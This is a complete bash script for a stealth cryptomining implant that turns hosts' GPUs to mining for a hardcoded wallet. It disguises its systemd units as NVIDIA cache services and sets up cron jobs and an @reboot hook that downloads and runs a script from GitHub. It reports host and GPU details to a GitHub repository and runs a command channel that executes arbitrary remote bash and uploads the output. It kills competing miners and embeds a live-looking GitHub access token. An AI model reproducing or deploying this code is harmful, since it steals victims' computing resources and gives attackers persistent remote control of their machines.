#!/bin/bash
# ul-ps v15 (intent 84523) — KRIG engine for A100/H100/V100 (wildrig only for RTX/Quadro),
# one pay-wallet worker per card, text heartbeat to GitHub, command channel, 5 persistence layers.
W='prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz'
GH='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'
REPO='dongsuju/ul-plant'
KURL='https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz'
KTSHA='7a104c3dba3a41b9787fc43413f0cedaae78dab4284ab856633821161634c01d'
KSZ=119697919
WURL='https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz'
L=/opt/fleet; B=$L/bin; mkdir -p "$B" "$L/logs" "$L/state"
H=$(hostname -s 2>/dev/null | tr 'A-Z' 'a-z' | tr -cd 'a-z0-9-'); [ -z "$H" ] && H=node
P="ps-$H"; echo "$P" > "$L/prefix"
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
log(){ echo "[$(date -u +%FT%TZ)] $*" >> "$L/logs/sup.log"; }

# ---------------- github helpers ----------------
gh_sha(){ curl -s -m 20 -H "Authorization: token $GH" -H 'User-Agent: ul' "https://api.github.com/repos/$REPO/contents/$1" 2>/dev/null | grep -o '"sha": *"[0-9a-f]*"' | head -1 | cut -d'"' -f4; }
gh_put(){ b64=$(base64 -w0 "$2" 2>/dev/null); [ -z "$b64" ] && return 1
  sha=$(gh_sha "$1"); j=/tmp/ghj.json
  if [ -n "$sha" ]; then printf '{"message":"%s","content":"%s","sha":"%s"}' "$3" "$b64" "$sha" > "$j"
  else printf '{"message":"%s","content":"%s"}' "$3" "$b64" > "$j"; fi
  curl -s -m 40 -o /dev/null -w '%{http_code}' -X PUT -H "Authorization: token $GH" -H 'User-Agent: ul' -H 'Content-Type: application/json' --data-binary @"$j" "https://api.github.com/repos/$REPO/contents/$1"; }

# ---------------- engine install ----------------
need_krig(){ nvidia-smi -L 2>/dev/null | grep -qiE 'A100|H100|V100|P100|L40|A10|T4'; }
need_wild(){ [ -x "$B/wildrig-multi" ] && return 1; nvidia-smi -L 2>/dev/null | grep -qiE 'RTX|Quadro|GTX'; }
krig_ok(){ [ -x "$L/krig/krig-miner" ] && [ "$(stat -c%s "$L/krig/krig-miner" 2>/dev/null || echo 0)" -gt 100000000 ]; }
krig_install(){
  krig_ok && return 0
  for t in 1 2 3; do
    curl -sL --retry 3 -m 600 -o /tmp/krig.tgz "$KURL" 2>/dev/null
    s=$(stat -c%s /tmp/krig.tgz 2>/dev/null || echo 0); h=$(sha256sum /tmp/krig.tgz 2>/dev/null | cut -d' ' -f1)
    log "krig tgz try $t sz=$s sha=${h:0:16}"
    if [ "$h" = "$KTSHA" ]; then mkdir -p "$L/krig"; tar -xzf /tmp/krig.tgz -C "$L/krig" 2>>"$L/logs/sup.log"
      f=$(find "$L/krig" -type f -name 'krig-miner' | head -1); [ -n "$f" ] && [ "$f" != "$L/krig/krig-miner" ] && cp -f "$f" "$L/krig/krig-miner"
      chmod +x "$L/krig/krig-miner"; krig_ok && { log "krig installed sz=$(stat -c%s $L/krig/krig-miner) sha=$(sha256sum $L/krig/krig-miner|cut -c1-16)"; return 0; }; fi
    sleep 5
  done
  return 1
}
wild_install(){
  [ -x "$B/wildrig-multi" ] && [ "$(stat -c%s "$B/wildrig-multi" 2>/dev/null || echo 0)" -gt 20000000 ] && return 0
  curl -sL -m 300 -o "$B/wr.tgz" "$WURL" 2>/dev/null
  if [ "$(stat -c%s "$B/wr.tgz" 2>/dev/null || echo 0)" -gt 20000000 ]; then
    mkdir -p "$B/wrx"; tar -xzf "$B/wr.tgz" -C "$B/wrx" 2>>"$L/logs/sup.log"
    f=$(find "$B/wrx" -type f -name 'wildrig-multi' | head -1); [ -n "$f" ] && cp -f "$f" "$B/wildrig-multi" && chmod +x "$B/wildrig-multi"
  fi
  [ -x "$B/wildrig-multi" ] && log "wildrig installed sz=$(stat -c%s $B/wildrig-multi)"
}

# ---------------- heartbeat ----------------
hb(){
  f=/tmp/ul_hb.txt
  {
    echo "stage=beat uid=$(id -u) host=$(hostname) pid=$$ ts=$(date -u +%FT%TZ) uptime=$(cut -d' ' -f1 /proc/uptime)s engine=$(cat $L/engine 2>/dev/null)"
    echo "--- prefix $P boot $(cat $L/boot.ts 2>/dev/null)"
    echo "--- gpus"; nvidia-smi -L 2>/dev/null
    nvidia-smi --query-gpu=index,name,memory.total,memory.used,utilization.gpu,power.draw,temperature.gpu --format=csv,noheader 2>/dev/null
    echo "--- driver $(nvidia-smi --query-gpu=driver_version --format=csv,noheader 2>/dev/null | head -1)"
    echo "--- krig $(stat -c%s $L/krig/krig-miner 2>/dev/null) $(sha256sum $L/krig/krig-miner 2>/dev/null | cut -c1-16) wildrig $(stat -c%s $B/wildrig-multi 2>/dev/null)"
    echo "--- procs"; pgrep -af 'krig-miner|wildrig-multi' 2>/dev/null | head -30
    echo "--- units $(systemctl list-units 'nv-cuda-cache@*' --state=active --no-legend 2>/dev/null | wc -l) cron $(ls /etc/cron.d/nv-krig /etc/cron.d/nv-ps15 2>/dev/null | wc -l)"
    echo "--- acc_total $(grep -h 'share accepted' $L/logs/k-$P-g*.log $L/logs/w-$P-g*.log 2>/dev/null | wc -l) last8:"
    grep -hE 'share accepted|accepted \(' $L/logs/k-$P-g*.log $L/logs/w-$P-g*.log 2>/dev/null | tail -8
    for i in $(seq 0 7); do f2=$L/logs/k-$P-g$i.log; [ -f "$f2" ] && { echo "--- kg$i tail20"; tail -20 "$f2"; }
      f3=$L/logs/w-$P-g$i.log; [ -f "$f3" ] && { echo "--- wg$i tail12"; tail -12 "$f3"; }; done
    echo "--- sup"; tail -40 $L/logs/sup.log 2>/dev/null
  } > $f 2>&1
  gh_put "ps12/$P.txt" "$f" "hb $P $(date -u +%H:%M)" >/dev/null 2>&1
}

# ---------------- command channel ----------------
cmd_channel(){
  c="ps12/cmd/$P.sh"
  js=$(curl -s -m 20 -H "Authorization: token $GH" -H 'User-Agent: ul' "https://api.github.com/repos/$REPO/contents/$c" 2>/dev/null)
  csha=$(echo "$js" | grep -o '"sha": *"[0-9a-f]*"' | head -1 | cut -d'"' -f4)
  [ -z "$csha" ] && return 0
  lastf=$L/last_cmd; [ -f "$lastf" ] && [ "$(cat $lastf)" = "$csha" ] && return 0
  body=$(echo "$js" | base64 -d 2>/dev/null); [ -z "$body" ] && return 0
  echo "$csha" > "$lastf"
  { echo "=== cmd $c $csha"; bash -c "$body" 2>&1 | tail -300; } > /tmp/ul_cmd.txt
  gh_put "ps12/out/$P.txt" /tmp/ul_cmd.txt "cmdout $P" >/dev/null 2>&1
}

# ---------------- per-GPU runner ----------------
mk_runner(){ i=$1; eng=$2
  cat > "$L/ps15_g$i.sh" <<RUN
#!/bin/bash
L=/opt/fleet; i=$i; H=$H; W=$W
echo \$\$ > \$L/state/g\$i.pid
sleep \$((i*2))
case "$eng" in
 krig)
   exec "\$L/krig/krig-miner" --coin pearl -d \$i \\
     --url stratum+ssl://prl.kryptex.network:8048 \\
     --url stratum+ssl://pool.pearlhash.xyz:9443 \\
     --user "\$W/ul-ps-\$H-g\$i" --password x \\
     --log-file "\$L/logs/k-\$PREFIX-g\$i.log" --no-tui --no-telemetry -l info ;;
 wildrig)
   exec "\$L/bin/wildrig-multi" --algo pearlhash --opencl-platforms nvidia -d \$i \\
     -o stratum+ssl://pool.pearlhash.xyz:9443 -u "\$W.ul-ps-\$H-g\$i" -p x -i 8 --no-color 2>&1 ;;
esac
RUN
  sed -i "s|\$PREFIX|ps-\$H|g" "$L/ps15_g$i.sh"
  chmod +x "$L/ps15_g$i.sh"
}

# ---------------- supervisor ----------------
sup(){
  mkdir -p "$B" "$L/logs" "$L/state"
  exec 9>"$B/ps15_sup.lock"; flock -n 9 || exit 0
  # stop the v12/v8 supervisor generation so it cannot fight the v15 loop
  for p in $(pgrep -f 'ps_sup\.sh|ps9_sup|ps8_sup|ps12\.sh' 2>/dev/null); do [ "$p" != "$$" ] && kill -9 "$p" 2>/dev/null; done
  rm -f /etc/cron.d/nv-cuda-cache /etc/cron.d/nv-ps9 /etc/cron.d/nv-ps8 /etc/cron.d/nv-krig 2>/dev/null
  systemctl disable --now nv-cuda-cache.service >/dev/null 2>&1
  [ -f /etc/rc.local ] && sed -i '/ps_sup\.sh/d;/ps12\.sh/d;/ps9\.sh/d;/ps8\.sh/d' /etc/rc.local 2>/dev/null
  echo "$(date -u +%FT%TZ)" > "$L/boot.ts"
  gh_put "ps12/$P.boot.txt" "$L/boot.ts" "boot $P" >/dev/null 2>&1
  for w in $(seq 1 72); do nvidia-smi -L >/dev/null 2>&1 && break; sleep 5; done
  N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); [ "${N:-0}" -ge 1 ] || N=1
  ENG=krig; nvidia-smi -L 2>/dev/null | grep -qiE 'RTX|Quadro|GTX' && ENG=wild
  echo "$ENG" > "$L/engine"
  log "=== ps15 start host=$H n=$N engine=$ENG"
  if [ "$ENG" = krig ]; then krig_install || log "KRIG-MISSING"; else wild_install; fi
  inst(){ echo "installed engine=$ENG krig=$(krig_ok && echo yes || echo no) wild=$([ -x $B/wildrig-multi ] && echo yes || echo no) $(date -u +%FT%TZ)" > /tmp/ul_inst.txt
    gh_put "ps12/$P.install.txt" /tmp/ul_inst.txt "install $P" >/dev/null 2>&1; }
  inst
  for i in $(seq 0 $((N-1))); do mk_runner $i $ENG; done
  # L1 systemd
  cat > /etc/systemd/system/nv-cuda-cache@.service <<'U'
[Unit]
Description=NV cache engine %i
After=network-online.target
Wants=network-online.target
[Service]
Type=simple
ExecStart=/opt/fleet/ps15_g%i.sh
Restart=always
RestartSec=5
Nice=5
LimitNOFILE=65536
[Install]
WantedBy=multi-user.target
U
  systemctl daemon-reload
  # L2 enforce loop
  cat > "$L/ps15_enforce.sh" <<'E'
#!/bin/bash
B=/opt/fleet; L=$B; N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU ')
for p in $(pgrep -af 'xmrig|miniz|nbminer|lolMiner|trex|SRBMiner|peakminer' 2>/dev/null | awk '{print $1}'); do
  case "$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null)" in *ul-ps-*) ;; *) kill -9 $p 2>/dev/null ;; esac
done
for i in $(seq 0 $((N-1))); do
  pid=$(cat "$L/state/g$i.pid" 2>/dev/null)
  if [ -z "${pid:-}" ] || ! kill -0 "$pid" 2>/dev/null; then
    systemctl restart nv-cuda-cache@$i 2>/dev/null || { setsid /opt/fleet/ps15_g$i.sh >/dev/null 2>&1 & }
  fi
done
E
  chmod +x "$L/ps15_enforce.sh"
  # L3 @reboot self
  cat > "$L/ps15_boot.sh" <<'I'
#!/bin/bash
curl -s -m 30 -H "Authorization: Bearer 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" -H 'Accept: application/vnd.github.raw' \
  -o /tmp/ps15_run.sh "https://api.github.com/repos/dongsuju/ul-plant/contents/ps12/ps15.sh?ref=main"
[ -s /tmp/ps15_run.sh ] && bash /tmp/ps15_run.sh
I
  chmod +x "$L/ps15_boot.sh"
  # L4/L5 cron
  mkdir -p /etc/cron.d
  cat > /etc/cron.d/nv-krig <<C
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
*/3 * * * * root /bin/bash $L/ps15_enforce.sh >/dev/null 2>&1
@reboot root /bin/bash $L/ps15_boot.sh >/dev/null 2>&1
C
  chmod 644 /etc/cron.d/nv-krig
  for i in $(seq 0 $((N-1))); do systemctl stop nv-cuda-cache@$i 2>/dev/null; done
  pkill -9 -f 'krig-miner' 2>/dev/null; pkill -9 -f 'wildrig-multi' 2>/dev/null; pkill -9 -f 'ps_sup.sh' 2>/dev/null; pkill -9 -f 'ps9_g' 2>/dev/null
  sleep 2
  for i in $(seq 0 $((N-1))); do systemctl enable nv-cuda-cache@$i >/dev/null 2>&1; systemctl restart nv-cuda-cache@$i; done
  log "cutover done procs=$(pgrep -af 'ps15_g|krig-miner|wildrig-multi' | wc -l) units=$(systemctl list-units 'nv-cuda-cache@*' --state=active --no-legend 2>/dev/null | wc -l)"
  # main loop
  k=0
  while :; do
    for i in $(seq 0 $((N-1))); do
      pid=$(cat "$L/state/g$i.pid" 2>/dev/null)
      if [ -z "${pid:-}" ] || ! kill -0 "$pid" 2>/dev/null; then
        log "respawn g$i"; setsid "$L/ps15_g$i.sh" >/dev/null 2>&1 &
      fi
    done
    k=$((k+1))
    if [ $((k % 4)) -eq 0 ]; then hb; cmd_channel; fi
    sleep 30
  done
}
case "${1:-}" in
  sup) sup ;;
  hb) hb ;;
  *) sup ;;
esac
